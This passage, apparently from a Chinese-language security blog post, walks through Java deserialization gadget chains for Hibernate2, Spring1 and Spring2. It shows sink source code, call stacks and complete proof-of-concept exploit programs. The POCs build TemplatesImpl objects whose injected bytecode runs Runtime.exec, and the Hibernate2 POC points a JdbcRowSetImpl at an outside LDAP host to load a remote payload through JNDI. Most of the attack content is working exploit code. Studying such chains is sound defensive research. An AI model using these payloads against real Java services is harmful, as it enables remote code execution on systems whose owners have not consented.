+initialize:78, TypedValue$1 (org.hibernate.engine.spi)
+getValue:55, ValueHolder (org.hibernate.internal.util)
+hashCode:56, TypedValue (org.hibernate.engine.spi)
+hash:362, HashMap (java.util)
+putForCreate:533, HashMap (java.util)
+readObject:1181, HashMap (java.util)
+</code></pre>
+<h1 id="Hibernate2"><a href="#Hibernate2" class="headerlink" title="Hibernate2"></a>Hibernate2</h1><p><strong>Sink</strong>换成了JDBC的<code>JdbcRowSetImpl#getDatabaseMetaData</code></p>
+<pre><code class="java">public class JdbcRowSetImpl extends BaseRowSet implements JdbcRowSet, Joinable &#123;
+
+        public DatabaseMetaData getDatabaseMetaData() throws SQLException &#123;
+        Connection var1 = this.connect();
+        return var1.getMetaData();
+    &#125;
+        
+    protected Connection connect() throws SQLException &#123;
+        if (this.conn != null) &#123;
+            return this.conn;
+        &#125; else if (this.getDataSourceName() != null) &#123;
+            try &#123;
+              
+                  // JNDI
+                InitialContext var1 = new InitialContext();
+                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+                return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
+            &#125; catch (NamingException var3) &#123;
+                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
+            &#125;
+        &#125; else &#123;
+            return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p><strong>POC:</strong></p>
+<pre><code class="java">import com.sun.rowset.JdbcRowSetImpl;
+import org.hibernate.engine.spi.TypedValue;
+import org.hibernate.property.access.spi.GetterMethodImpl;
+import org.hibernate.tuple.component.PojoComponentTuplizer;
+import org.hibernate.type.ComponentType;
+import org.hibernate.type.Type;
+import sun.reflect.ReflectionFactory;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+
+public class Hibernate2 &#123;
+    public static void main(String[] args) throws Exception&#123;
+
+        // 实例化 JdbcRowSetImpl 类
+        JdbcRowSetImpl rs = new JdbcRowSetImpl();
+        rs.setDataSourceName(&quot;ldap://192.168.80.10:61389/Deserialization/CommonsCollections6/command/Base64/Y2FsYw==&quot;);
+        Method method = JdbcRowSetImpl.class.getDeclaredMethod(&quot;getDatabaseMetaData&quot;);
+
+        // 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
+        Class&lt;?&gt;       getterImpl  = Class.forName(&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;);
+        Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[0];
+        constructor.setAccessible(true);
+        GetterMethodImpl getter = (GetterMethodImpl) constructor.newInstance(null, null, method);
+
+
+        Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;);
+        Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;);
+        Class&lt;?&gt; componentTypeClass             = Class.forName(&quot;org.hibernate.type.ComponentType&quot;);
+
+
+        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(pojoComponentTuplizerClass,  Object.class.getConstructor(new Class[0]));
+        PojoComponentTuplizer tuplizer= (PojoComponentTuplizer) sc.newInstance(new Object[0]);
+
+        // 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
+        Field field222 = abstractComponentTuplizerClass.getDeclaredField(&quot;getters&quot;);
+        field222.setAccessible(true);
+        Object getters = Array.newInstance(getter.getClass(), 1);
+        Array.set(getters, 0, getter);
+        field222.set(tuplizer, getters);
+
+        Constructor&lt;?&gt; sc2 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(componentTypeClass,  Object.class.getConstructor(new Class[0]));
+        ComponentType type= (ComponentType) sc2.newInstance(new Object[0]);
+
+        Field field11 = componentTypeClass.getDeclaredField(&quot;componentTuplizer&quot;);
+        field11.setAccessible(true);
+        field11.set(type, tuplizer);
+
+        Field field2 = componentTypeClass.getDeclaredField(&quot;propertySpan&quot;);
+        field2.setAccessible(true);
+        field2.set(type, 1);
+
+        Field field3 = componentTypeClass.getDeclaredField(&quot;propertyTypes&quot;);
+        field3.setAccessible(true);
+        field3.set(type, new Type[]&#123;type&#125;);
+
+        // 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
+        TypedValue typedValue = new TypedValue(type, null);
+
+        // 创建反序列化用 HashMap
+        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+        hashMap.put(typedValue, &quot;test&quot;);
+
+        // put 到 hashmap 之后再反射写入，防止 put 时触发
+        Field valueField = TypedValue.class.getDeclaredField(&quot;value&quot;);
+        valueField.setAccessible(true);
+        valueField.set(typedValue, rs);
+
+        // 模拟序列化和反序列化
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
+        outputStream.writeObject(hashMap);
+        outputStream.close();
+
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
+        inputStream.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/2023/07/13/Java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963/CpZO/blog/source/_posts/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.assets/image-20230717094833008.png" alt="image-20230717094833008"></p>
+<p><img src="/2023/07/13/Java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963/CpZO/blog/source/_posts/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.assets/image-20230717094903992.png" alt="image-20230717094903992"></p>
+<h1 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h1><p>POM依赖：</p>
+<pre><code class="xml">  &lt;dependency&gt;
+      &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+      &lt;artifactId&gt;spring-core&lt;/artifactId&gt;
+      &lt;version&gt;4.1.4.RELEASE&lt;/version&gt;
+  &lt;/dependency&gt;
+
+  &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-beans --&gt;
+  &lt;dependency&gt;
+      &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+      &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;
+      &lt;version&gt;4.1.4.RELEASE&lt;/version&gt;
+  &lt;/dependency&gt;
+</code></pre>
+<p><strong>Sink:</strong></p>
+<p><code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code> ，在readObject中可以使用<code>ReflectionUtils.invokeMethod</code>可以把this.provider.getType处理成<code>TemplatesImpl</code>，methodName处理成<code>newTransformer</code></p>
+<pre><code class="java">    static class MethodInvokeTypeProvider implements TypeProvider &#123;
+        private final TypeProvider provider;
+        private final String methodName;
+        private final int index;
+        private transient Object result;
+
+        public MethodInvokeTypeProvider(TypeProvider provider, Method method, int index) &#123;
+            this.provider = provider;
+            this.methodName = method.getName();
+            this.index = index;
+            this.result = ReflectionUtils.invokeMethod(method, provider.getType());
+        &#125;
+
+        public Type getType() &#123;
+            return !(this.result instanceof Type) &amp;&amp; this.result != null ? ((Type[])((Type[])this.result))[this.index] : (Type)this.result;
+        &#125;
+
+        private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException &#123;
+            inputStream.defaultReadObject();
+              // 触发点
+            Method method = ReflectionUtils.findMethod(this.provider.getType().getClass(), this.methodName);
+            this.result = ReflectionUtils.invokeMethod(method, this.provider.getType());
+        &#125;
+    &#125;
+</code></pre>
+<p><strong>Chain</strong>:</p>
+<p>为了触发<code>MethodInvokeTypeProvider</code>需要构造好<code>TypeProvider</code>，使其<code>getType</code>方法可以返回<code>TemplatesImpl</code></p>
+<p><code>TypeProvider</code>接口：</p>
+<pre><code class="java">interface TypeProvider extends Serializable &#123;
+    Type getType();
+    Object getSource();
+&#125;
+</code></pre>
+<p>这里引入<code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code> ，这是一个动态代理处理类，使用动态代理为TypeProvider的getType包装上返回<code>TemplatesImpl</code></p>
+<p><code>ObjectFactoryDelegatingInvocationHandler</code>封装后的动态代理类都会执行invoke方法，也就是<code>this.objectFactory#getObject</code>，这时候有两个关键点：</p>
+<pre><code>1. this.objectFactory.getObject()可以返回`TemplatesImpl`
+2. 需要一个点来执行，`ObjectFactoryDelegatingInvocationHandler#invoke`
+</code></pre>
+<pre><code class="java">private static class ObjectFactoryDelegatingInvocationHandler implements InvocationHandler, Serializable &#123;
+    private final ObjectFactory&lt;?&gt; objectFactory;
+
+    public ObjectFactoryDelegatingInvocationHandler(ObjectFactory&lt;?&gt; objectFactory) &#123;
+        this.objectFactory = objectFactory;
+    &#125;
+
+    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;
+        String methodName = method.getName();
+        if (methodName.equals(&quot;equals&quot;)) &#123;
+            return proxy == args[0];
+        &#125; else if (methodName.equals(&quot;hashCode&quot;)) &#123;
+            return System.identityHashCode(proxy);
+        &#125; else if (methodName.equals(&quot;toString&quot;)) &#123;
+            return this.objectFactory.toString();
+        &#125; else &#123;
+            try &#123;
+                // this.objectFactory.getObject()
+                // this.objectFactory 如果为 AnnotationInvocationHandler 动态代理创建，
+                // AnnotationInvocationHandler 返回以方法名作为键名的map的对象，也就是说
+                // getObject 方法会返回 TemplatesImpl
+                return method.invoke(this.objectFactory.getObject(), args);
+            &#125; catch (InvocationTargetException var6) &#123;
+                throw var6.getTargetException();
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>解决第一个点，构造this.objectFactory是继续使用动态代理<code>AnnotationInvocationHandler</code>，</p>
+<pre><code class="java">// 构造this.objectFactory
+Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
+constructor.setAccessible(true);
+HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();
+map.put(&quot;getObject&quot;, templatesImpl);
+InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);
+ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(
+        ClassLoader.getSystemClassLoader(), new Class[]&#123;ObjectFactory.class&#125;, invocationHandler);
+</code></pre>
+<p>所以需要先使用动态代理构造一个可以返回<code>TemplatesImpl</code>的<code>ObjectFactory</code>：</p>
+<pre><code class="java">  Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+  Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
+  constructor.setAccessible(true);
+
+  HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();
+  map.put(&quot;getObject&quot;, templatesImpl);
+
+  InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);
+
+  ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(
+          ClassLoader.getSystemClassLoader(), new Class[]&#123;ObjectFactory.class&#125;, invocationHandler);
+</code></pre>
+<p>这里回顾一下<code>AnnotationInvocationHandler</code>会返回memberValues中键为方法名的值，也就是这个动态代理创建出来的类，执行<code>getObject</code>时会返回<code>templatesImpl</code>对象</p>
+<pre><code class="java">public Object invoke(Object var1, Method var2, Object[] var3) &#123;
+      // 获取方法名
+    String var4 = var2.getName();
+    Class[] var5 = var2.getParameterTypes();
+    if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;
+        return this.equalsImpl(var3[0]);
+    &#125; else if (var5.length != 0) &#123;
+        throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);
+    &#125; else &#123;
+        switch (var4) &#123;
+            case &quot;toString&quot;:
+                return this.toStringImpl();
+            case &quot;hashCode&quot;:
+                return this.hashCodeImpl();
+            case &quot;annotationType&quot;:
+                return this.type;
+            default:
+                    // 返回map中以方法名为键名的对象
+                Object var6 = this.memberValues.get(var4);
+                if (var6 == null) &#123;
+                    throw new IncompleteAnnotationException(this.type, var4);
+                &#125; else if (var6 instanceof ExceptionProxy) &#123;
+                    throw ((ExceptionProxy)var6).generateException();
+                &#125; else &#123;
+                    if (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != 0) &#123;
+                        var6 = this.cloneArray(var6);
+                    &#125;
+
+                    return var6;
+                &#125;
+        &#125;
+    &#125;
+</code></pre>
+<p>继续解决第二个点，也就是需要执行<code>ObjectFactoryDelegatingInvocationHandler#invoke</code>，如果使用ObjectFactoryDelegatingInvocationHandler动态代理来创建对象将其作为<code>MethodInvokeTypeProvider</code>的<code>TypeProvider</code>，当其执行getType时，就触发了上面构造链</p>
+<pre><code class="java">// 构造TypeProvider
+Class&lt;?&gt;       clazz          = Class.forName(&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;);
+Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[0];
+ofdConstructor.setAccessible(true);
+// 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler
+InvocationHandler ofdHandler = (InvocationHandler) ofdConstructor.newInstance(factory);    
+Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+        new Class[]&#123;Type.class, Templates.class&#125;, ofdHandler);
+
+// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类
+HashMap&lt;String, Object&gt; map2 = new HashMap&lt;&gt;();
+map2.put(&quot;getType&quot;, typeTemplateProxy);
+</code></pre>
+<p><strong>完整POC:</strong></p>
+<pre><code class="java">import javassist.ClassPool;
+import javassist.CtClass;
+import org.springframework.beans.factory.ObjectFactory;
+
+import javax.xml.transform.Templates;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.*;
+import java.util.HashMap;
+
+public class Spring1 &#123;
+    public static void main(String[] args) throws Exception&#123;
+        // 需要反射的两个类
+        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
+        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
+
+        // 这里需要借助javassist中的相关方法，
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.appendClassPath(AbstractTranslet);
+        // 动态创建类
+        CtClass payload = classPool.makeClass(&quot;TemplateClass&quot;);
+        // 动态设置父类
+        payload.setSuperclass(classPool.get(AbstractTranslet));
+        // 添加静态代码块
+        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
+        // 保存字节码
+        byte[] bytes = payload.toBytecode();
+
+        // 反射创建TemplatesImpl类实例
+        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();
+        // 反射修改其中的_bytecodes属性
+        Field field=templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+        field.setAccessible(true);
+        field.set(templatesImpl,new byte[][]&#123;bytes&#125;);
+
+        // 反射修改其中的_name属性
+        Field field1=templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);
+        field1.setAccessible(true);
+        field1.set(templatesImpl,&quot;test&quot;);
+
+        Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
+        constructor.setAccessible(true);
+
+        HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();
+        map.put(&quot;getObject&quot;, templatesImpl);
+
+        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);
+
+        ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(
+                ClassLoader.getSystemClassLoader(), new Class[]&#123;ObjectFactory.class&#125;, invocationHandler);
+
+        Class&lt;?&gt;       clazz          = Class.forName(&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;);
+        Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[0];
+        ofdConstructor.setAccessible(true);
+        // 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler
+        InvocationHandler ofdHandler = (InvocationHandler) ofdConstructor.newInstance(factory);
+
+        // ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler
+        // 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法
+        // 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类
+        // 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法
+        Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+                new Class[]&#123;Type.class, Templates.class&#125;, ofdHandler);
+
+
+        // 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类
+        HashMap&lt;String, Object&gt; map2 = new HashMap&lt;&gt;();
+        map2.put(&quot;getType&quot;, typeTemplateProxy);
+
+        InvocationHandler newInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map2);
+
+        Class&lt;?&gt; typeProviderClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;);
+        // 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy
+        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+                new Class[]&#123;typeProviderClass&#125;, newInvocationHandler);
+
+        // 初始化 MethodInvokeTypeProvider
+        Class&lt;?&gt;       clazz2 = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;);
+        Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[0];
+        cons.setAccessible(true);
+        // 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())
+        // 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去
+        Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod(&quot;toString&quot;), 0);
+        Field  fieldmethodName   = clazz2.getDeclaredField(&quot;methodName&quot;);
+        fieldmethodName.setAccessible(true);
+        fieldmethodName.set(objects, &quot;newTransformer&quot;);
+
+        // 模拟序列化和反序列化
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
+        outputStream.writeObject(objects);
+        outputStream.close();
+
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
+        inputStream.readObject();
+
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/2023/07/13/Java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963/CpZO/blog/source/_posts/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.assets/image-20230717162328145.png" alt="image-20230717162328145"></p>
+<p><strong>调用链：</strong></p>
+<pre><code>getTransletInstance:408, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+newTransformer:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:57, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:606, Method (java.lang.reflect)
+invoke:307, AutowireUtils$ObjectFactoryDelegatingInvocationHandler (org.springframework.beans.factory.support)
+newTransformer:-1, $Proxy1 (com.sun.proxy)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:57, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:606, Method (java.lang.reflect)
+invokeMethod:202, ReflectionUtils (org.springframework.util)
+invokeMethod:187, ReflectionUtils (org.springframework.util)
+readObject:404, SerializableTypeWrapper$MethodInvokeTypeProvider (org.springframework.core)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:57, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:606, Method (java.lang.reflect)
+invokeReadObject:1017, ObjectStreamClass (java.io)
+readSerialData:1893, ObjectInputStream (java.io)
+readOrdinaryObject:1798, ObjectInputStream (java.io)
+readObject0:1350, ObjectInputStream (java.io)
+readObject:370, ObjectInputStream (java.io)
+main:98, Spring1
+</code></pre>
+<h1 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h1><p>POM依赖：</p>
+<pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-core&lt;/artifactId&gt;
+    &lt;version&gt;4.1.4.RELEASE&lt;/version&gt;
+&lt;/dependency&gt;
+
+&lt;dependency&gt;
+    &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-aop&lt;/artifactId&gt;
+    &lt;version&gt;4.1.4.RELEASE&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p><strong>Sink点还是MethodInvokeTypeProvider</strong></p>
+<p><strong>Chain:</strong></p>
+<p><code>org.springframework.aop.framework.JdkDynamicAopProxy</code></p>
+<pre><code class="java">final class JdkDynamicAopProxy implements AopProxy, InvocationHandler, Serializable &#123;
+  
+    public JdkDynamicAopProxy(AdvisedSupport config) throws AopConfigException &#123;
+        Assert.notNull(config, &quot;AdvisedSupport must not be null&quot;);
+        if (config.getAdvisors().length == 0 &amp;&amp; config.getTargetSource() == AdvisedSupport.EMPTY_TARGET_SOURCE) &#123;
+            throw new AopConfigException(&quot;No advisors and no TargetSource specified&quot;);
+        &#125; else &#123;
+            this.advised = config;
+        &#125;
+    &#125;
+  
+        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;
+        Object oldProxy = null;
+        boolean setProxyContext = false;
+        TargetSource targetSource = this.advised.targetSource;
+        Class&lt;?&gt; targetClass = null;
+        Object target = null;
+
+        Object var13;
+        try &#123;
+            if (!this.equalsDefined &amp;&amp; AopUtils.isEqualsMethod(method)) &#123;
+                Boolean var18 = this.equals(args[0]);
+                return var18;
+            &#125;
+
+            if (!this.hashCodeDefined &amp;&amp; AopUtils.isHashCodeMethod(method)) &#123;
+                Integer var17 = this.hashCode();
+                return var17;
+            &#125;
+
+            Object retVal;
+            if (!this.advised.opaque &amp;&amp; method.getDeclaringClass().isInterface() &amp;&amp; method.getDeclaringClass().isAssignableFrom(Advised.class)) &#123;
+              
+                  // Sink点
+                retVal = AopUtils.invokeJoinpointUsingReflection(this.advised, method, args);
+                return retVal;
+            &#125;
+          
+          // ....
+    
+    &#125;
+&#125;
+</code></pre>
+<p><code>AopUtils.invokeJoinpointUsingReflection</code></p>
+<pre><code class="java">public abstract class AopUtils &#123;
+    
+        public static Object invokeJoinpointUsingReflection(Object target, Method method, Object[] args) throws Throwable &#123;
+        try &#123;
+            ReflectionUtils.makeAccessible(method);
+            return method.invoke(target, args);
+        &#125; 
+      // ....
+
+    &#125;
+&#125;
+</code></pre>
+<p><strong>POC:</strong></p>
+<pre><code class="java">import javassist.ClassPool;
+import javassist.CtClass;
+import org.springframework.aop.framework.AdvisedSupport;
+
+import javax.xml.transform.Templates;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.*;
+import java.util.HashMap;
+
+public class Spring2 &#123;
+    public static void main(String[] args)  throws Exception &#123;
+        // 需要反射的两个类
+        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
+        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
+
+        // 这里需要借助javassist中的相关方法，
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.appendClassPath(AbstractTranslet);
+        // 动态创建类
+        CtClass payload = classPool.makeClass(&quot;TemplateClass&quot;);
+        // 动态设置父类
+        payload.setSuperclass(classPool.get(AbstractTranslet));
+        // 添加静态代码块
+        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
+        // 保存字节码
+        byte[] bytes = payload.toBytecode();
+
+        // 反射创建TemplatesImpl类实例
+        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();
+        // 反射修改其中的_bytecodes属性
+        Field field=templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+        field.setAccessible(true);
+        field.set(templatesImpl,new byte[][]&#123;bytes&#125;);
+
+        // 反射修改其中的_name属性
+        Field field1=templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);
+        field1.setAccessible(true);
+        field1.set(templatesImpl,&quot;test&quot;);
+
+        // 实例化 AdvisedSupport
+        AdvisedSupport as = new AdvisedSupport();
+        as.setTarget(templatesImpl);
+
+        // 使用 AnnotationInvocationHandler 动态代理
+        Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
+        constructor.setAccessible(true);
+
+        // JdkDynamicAopProxy 的 invoke 方法触发 TargetSource 的 getTarget 返回 tmpl
+        // 并且会调用 method.invoke(返回值,args)
+        // 此时返回值被我们使用动态代理改为了 TemplatesImpl
+        // 接下来需要 method 是 newTransformer()，就可以触发调用链了
+        Class&lt;?&gt;       clazz          = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;);
+        Constructor&lt;?&gt; aopConstructor = clazz.getDeclaredConstructors()[0];
+        aopConstructor.setAccessible(true);
+        // 使用 AdvisedSupport 实例化 JdkDynamicAopProxy
+        InvocationHandler aopProxy = (InvocationHandler) aopConstructor.newInstance(as);
+
+        // JdkDynamicAopProxy 本身就是个 InvocationHandler
+        // 使用它来代理一个类，这样在这个类调用时将会触发 JdkDynamicAopProxy 的 invoke 方法
+        // 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类
+        // 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法
+        Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+                new Class[]&#123;Type.class, Templates.class&#125;, aopProxy);
+
+
+        // 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类
+        HashMap&lt;String, Object&gt; map2 = new HashMap&lt;&gt;();
+        map2.put(&quot;getType&quot;, typeTemplateProxy);
+
+        InvocationHandler newInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map2);
+
+        Class&lt;?&gt; typeProviderClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;);
+        // 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy
+        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+                new Class[]&#123;typeProviderClass&#125;, newInvocationHandler);
+
+
+        // 初始化 MethodInvokeTypeProvider
+        Class&lt;?&gt;       clazz2 = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;);
+        Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[0];
+        cons.setAccessible(true);
+        // 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())
+        // 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去
+        Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod(&quot;toString&quot;), 0);
+        Field  fieldMethod   = clazz2.getDeclaredField(&quot;methodName&quot;);
+        fieldMethod.setAccessible(true);
+        fieldMethod.set(objects, &quot;newTransformer&quot;);
+
+        // 模拟序列化和反序列化
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
+        outputStream.writeObject(objects);
+        outputStream.close();
+
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
+        inputStream.readObject();
+
+    &#125;
+&#125;
+</code></pre>
+<p>调用链：</p>
+<pre><code>getTransletInstance:408, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+newTransformer:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:57, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:606, Method (java.lang.reflect)
+invokeJoinpointUsingReflection:317, AopUtils (org.springframework.aop.support)
+invoke:201, JdkDynamicAopProxy (org.springframework.aop.framework)
+newTransformer:-1, $Proxy0 (com.sun.proxy)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:57, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:606, Method (java.lang.reflect)
